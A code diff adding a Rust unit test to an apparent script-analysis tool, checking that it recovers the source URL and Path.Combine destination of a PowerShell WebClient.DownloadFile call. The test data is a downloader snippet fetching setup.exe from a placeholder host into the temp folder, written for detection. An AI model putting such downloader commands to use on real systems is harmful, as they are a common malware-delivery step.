@@ -13488,6 +13488,28 @@ $clnt.DownloadFile($url,$file)
     }
 
     #[test]
+    fn raw_powershell_downloadfile_path_combine_destination_extracted() {
+        let script = r#"$clnt = New-Object System.Net.WebClient
+$url = "https://download-path-combine.example/setup.exe"
+$exeFile = [System.IO.Path]::Combine($env:TEMP, 'setup.exe')
+$clnt.DownloadFile($url,$exeFile)
+"#;
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://download-path-combine.example/setup.exe"
+                        && dst.as_deref() == Some("$env:TEMP\\setup.exe")
+            )
+        });
+        assert!(
+            has,
+            "Path.Combine destination variable was not recovered for DownloadFile: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn raw_powershell_mixed_case_downloadfile_variable_url_extracted() {
         let script = r#"$clnt = New-Object System.Net.WebClient
 $url = "http://download-case.example/tool.exe"
